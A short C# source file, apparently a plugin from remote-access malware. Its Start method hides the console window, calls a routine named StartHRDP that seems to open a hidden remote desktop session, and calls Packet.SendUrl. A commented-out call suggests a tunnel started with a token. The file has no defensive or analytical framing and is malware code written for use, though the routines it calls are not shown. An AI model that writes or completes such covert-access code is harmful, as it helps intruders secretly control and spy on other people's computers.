using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Plugin;

namespace Plugin
{

    internal class Omega
    {
        public const int SW_HIDE = 0;

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();

        [STAThread]
        public static void Start(string token)
        {
            ShowWindow(GetConsoleWindow(), 0);
            //Grok.StartGrok(token);
            Grok.StartHRDP();
            Packet.SendUrl();
        }

        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    }

}

